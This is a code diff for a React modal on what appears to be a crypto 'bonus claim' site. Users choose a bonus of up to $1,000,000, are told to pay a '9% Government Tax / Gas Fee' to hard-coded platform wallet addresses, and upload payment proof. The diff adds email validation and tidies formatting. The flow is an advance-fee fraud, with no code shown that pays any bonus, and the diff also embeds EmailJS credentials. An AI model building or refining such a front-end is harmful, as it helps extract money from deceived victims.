@@ -19,6 +19,7 @@ import {
   User,
   Mail,
   DollarSign,
+  AlertCircle,
 } from "lucide-react";
 import { useCoinPrices } from "@/hooks/useCoinPrices";
 
@@ -30,7 +31,6 @@ const CLAIM_AMOUNTS = [
   2500, 5000, 10000, 25000, 50000, 100000, 250000, 500000, 1000000,
 ];
 
-// Each token has its own wallet address for tax/gas fee payment
 const PLATFORM_WALLETS: Record<string, string> = {
   BTC: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
   ETH: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
@@ -39,6 +39,11 @@ const PLATFORM_WALLETS: Record<string, string> = {
   SOL: "7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV",
   XRP: "rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh",
 };
+
+// Validates a reasonably strict RFC-5321 subset
+const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
+
+const isValidEmail = (value: string) => EMAIL_REGEX.test(value.trim());
 
 interface ApplicationModalProps {
   open: boolean;
@@ -51,6 +56,7 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
   const [step, setStep] = useState(0);
   const [fullName, setFullName] = useState("");
   const [email, setEmail] = useState("");
+  const [emailTouched, setEmailTouched] = useState(false);
   const [walletAddress, setWalletAddress] = useState("");
   const [selectedCoin, setSelectedCoin] = useState("BTC");
   const [claimAmountUsd, setClaimAmountUsd] = useState(2500);
@@ -62,20 +68,28 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
   const coin = coins.find((c) => c.symbol === selectedCoin)!;
   const wallet = PLATFORM_WALLETS[selectedCoin] || PLATFORM_WALLETS.BTC;
 
-  // Bonus in crypto = claim amount USD / coin price (unaffected by tax)
   const bonusCrypto = useMemo(() => {
-    if (!coin.price) return 0;
+    if (!coin?.price) return 0;
     return claimAmountUsd / coin.price;
-  }, [claimAmountUsd, coin.price]);
+  }, [claimAmountUsd, coin?.price]);
 
-  // Tax calculated on the claim amount separately
   const taxUsd = claimAmountUsd * TAX_RATE;
   const taxCrypto = useMemo(() => {
-    if (!coin.price) return 0;
+    if (!coin?.price) return 0;
     return taxUsd / coin.price;
-  }, [taxUsd, coin.price]);
+  }, [taxUsd, coin?.price]);
+
+  // Derived validation state
+  const emailValid = isValidEmail(email);
+  const showEmailError = emailTouched && !emailValid;
+
+  const canApply = fullName.trim() && emailValid && walletAddress.trim();
+  const canSubmitProof = txHash.trim() || proofFile;
 
   const handleApply = () => {
+    // Always mark touched so the error surfaces if user skipped the field
+    setEmailTouched(true);
+    if (!emailValid) return;
     setStep(1);
   };
 
@@ -86,17 +100,26 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
   };
 
   const handleSubmitProof = () => {
-    emailjs.send("service_tsr17gh", "template_5o9jymt", {
-      to_email: email,
-      user_name: fullName,
-      selected_coin: selectedCoin,
-      bonus_amount: `${bonusCrypto.toFixed(6)} ${selectedCoin}`,
-      bonus_usd: `$${claimAmountUsd.toLocaleString()}`,
-      tax_amount: `${taxCrypto.toFixed(6)} ${selectedCoin}`,
-      tax_usd: `$${taxUsd.toLocaleString(undefined, { maximumFractionDigits: 2 })}`,
-      wallet_address: walletAddress,
-      tx_hash: txHash || "Screenshot uploaded",
-    }, "oXPWYhRUKU0tlucOg").catch(console.error);
+    emailjs
+      .send(
+        "service_tsr17gh",
+        "template_5o9jymt",
+        {
+          to_email: email,
+          user_name: fullName,
+          selected_coin: selectedCoin,
+          bonus_amount: `${bonusCrypto.toFixed(6)} ${selectedCoin}`,
+          bonus_usd: `$${claimAmountUsd.toLocaleString()}`,
+          tax_amount: `${taxCrypto.toFixed(6)} ${selectedCoin}`,
+          tax_usd: `$${taxUsd.toLocaleString(undefined, {
+            maximumFractionDigits: 2,
+          })}`,
+          wallet_address: walletAddress,
+          tx_hash: txHash || "Screenshot uploaded",
+        },
+        "oXPWYhRUKU0tlucOg"
+      )
+      .catch(console.error);
     setStep(3);
   };
 
@@ -106,6 +129,7 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
       setStep(0);
       setFullName("");
       setEmail("");
+      setEmailTouched(false);
       setWalletAddress("");
       setSelectedCoin("BTC");
       setClaimAmountUsd(2500);
@@ -113,9 +137,6 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
       setTxHash("");
     }, 300);
   };
-
-  const canApply = fullName.trim() && email.trim() && walletAddress.trim();
-  const canSubmitProof = txHash.trim() || proofFile;
 
   return (
     <Dialog open={open} onOpenChange={handleClose}>
@@ -142,7 +163,7 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
         </div>
 
         <AnimatePresence mode="wait">
-          {/* Step 0: Application form */}
+          {/* ── Step 0: Application form ── */}
           {step === 0 && (
             <motion.div
               key="step0"
@@ -151,10 +172,13 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
               exit={{ opacity: 0, x: -20 }}
               className="space-y-4"
             >
+              {/* Full Name */}
               <div>
-                <label className="text-sm text-muted-foreground mb-1.5 block">Full Name</label>
+                <label className="text-sm text-muted-foreground mb-1.5 block">
+                  Full Name
+                </label>
                 <div className="flex items-center gap-2 glass-card rounded-lg px-3 py-2.5">
-                  <User className="h-4 w-4 text-muted-foreground" />
+                  <User className="h-4 w-4 text-muted-foreground shrink-0" />
                   <input
                     value={fullName}
                     onChange={(e) => setFullName(e.target.value)}
@@ -164,22 +188,58 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                 </div>
               </div>
 
+              {/* Email with validation */}
               <div>
-                <label className="text-sm text-muted-foreground mb-1.5 block">Email</label>
-                <div className="flex items-center gap-2 glass-card rounded-lg px-3 py-2.5">
-                  <Mail className="h-4 w-4 text-muted-foreground" />
+                <label className="text-sm text-muted-foreground mb-1.5 block">
+                  Email
+                </label>
+                <div
+                  className={`flex items-center gap-2 glass-card rounded-lg px-3 py-2.5 transition-colors ${
+                    showEmailError
+                      ? "border-destructive ring-1 ring-destructive/50"
+                      : emailTouched && emailValid
+                      ? "border-success/50"
+                      : ""
+                  }`}
+                >
+                  <Mail
+                    className={`h-4 w-4 shrink-0 transition-colors ${
+                      showEmailError
+                        ? "text-destructive"
+                        : emailTouched && emailValid
+                        ? "text-success"
+                        : "text-muted-foreground"
+                    }`}
+                  />
                   <input
                     type="email"
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
+                    onBlur={() => setEmailTouched(true)}
                     placeholder="john@example.com"
                     className="bg-transparent text-foreground text-sm outline-none flex-1 placeholder:text-muted-foreground/50"
                   />
+                  {emailTouched && (
+                    emailValid ? (
+                      <CheckCircle2 className="h-4 w-4 text-success shrink-0" />
+                    ) : (
+                      <AlertCircle className="h-4 w-4 text-destructive shrink-0" />
+                    )
+                  )}
                 </div>
+                {showEmailError && (
+                  <p className="text-xs text-destructive mt-1.5 flex items-center gap-1">
+                    <AlertCircle className="h-3 w-3" />
+                    Please enter a valid email address
+                  </p>
+                )}
               </div>
 
+              {/* Coin selector */}
               <div>
-                <label className="text-sm text-muted-foreground mb-1.5 block">Preferred Cryptocurrency</label>
+                <label className="text-sm text-muted-foreground mb-1.5 block">
+                  Preferred Cryptocurrency
+                </label>
                 <div className="grid grid-cols-3 gap-2">
                   {coins.map((c) => (
                     <button
@@ -197,12 +257,13 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                 </div>
               </div>
 
+              {/* Wallet address */}
               <div>
                 <label className="text-sm text-muted-foreground mb-1.5 block">
                   Your {selectedCoin} Wallet Address
                 </label>
                 <div className="flex items-center gap-2 glass-card rounded-lg px-3 py-2.5">
-                  <Wallet className="h-4 w-4 text-muted-foreground" />
+                  <Wallet className="h-4 w-4 text-muted-foreground shrink-0" />
                   <input
                     value={walletAddress}
                     onChange={(e) => setWalletAddress(e.target.value)}
@@ -212,7 +273,7 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                 </div>
               </div>
 
-              {/* Claim amount selector */}
+              {/* Claim amount */}
               <div>
                 <label className="text-sm text-muted-foreground mb-1.5 block">
                   <DollarSign className="h-3.5 w-3.5 inline mr-1" />
@@ -247,7 +308,7 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
             </motion.div>
           )}
 
-          {/* Step 1: Show allocated bonus + tax fee (separate) */}
+          {/* ── Step 1: Bonus allocation + tax fee ── */}
           {step === 1 && (
             <motion.div
               key="step1"
@@ -257,7 +318,9 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
               className="space-y-4"
             >
               <div className="text-center py-4">
-                <p className="text-muted-foreground text-sm mb-2">Your Bonus (Unaffected by Tax)</p>
+                <p className="text-muted-foreground text-sm mb-2">
+                  Your Bonus (Unaffected by Tax)
+                </p>
                 <p className="text-4xl font-display font-bold gold-text">
                   {bonusCrypto.toFixed(6)} {selectedCoin}
                 </p>
@@ -274,13 +337,17 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                   </span>
                 </div>
                 <div className="flex justify-between py-2 border-b border-border">
-                  <span className="text-muted-foreground text-sm">Current {selectedCoin} Price</span>
+                  <span className="text-muted-foreground text-sm">
+                    Current {selectedCoin} Price
+                  </span>
                   <span className="text-foreground font-medium text-sm">
-                    ${coin.price.toLocaleString(undefined, { maximumFractionDigits: 2 })}
+                    ${coin?.price.toLocaleString(undefined, { maximumFractionDigits: 2 })}
                   </span>
                 </div>
                 <div className="flex justify-between py-2 border-b border-border">
-                  <span className="text-muted-foreground text-sm">Government Tax / Gas Fee (9%)</span>
+                  <span className="text-muted-foreground text-sm">
+                    Government Tax / Gas Fee (9%)
+                  </span>
                   <span className="text-primary font-medium text-sm">9%</span>
                 </div>
                 <div className="flex justify-between py-2 border-b border-border">
@@ -343,7 +410,7 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
             </motion.div>
           )}
 
-          {/* Step 2: Upload proof */}
+          {/* ── Step 2: Upload proof ── */}
           {step === 2 && (
             <motion.div
               key="step2"
@@ -416,7 +483,7 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
             </motion.div>
           )}
 
-          {/* Step 3: Confirmation */}
+          {/* ── Step 3: Confirmation ── */}
           {step === 3 && (
             <motion.div
               key="step3"
@@ -436,7 +503,8 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                   {bonusCrypto.toFixed(6)} {selectedCoin}
                 </span>{" "}
                 (≈ ${claimAmountUsd.toLocaleString()}) will be sent to your wallet within{" "}
-                <span className="text-success font-semibold">60 minutes</span> after verification.
+                <span className="text-success font-semibold">60 minutes</span> after
+                verification.
               </p>
               <div className="glass-card rounded-lg p-3 inline-flex items-center gap-2 text-sm">
                 <Clock className="h-4 w-4 text-primary" />
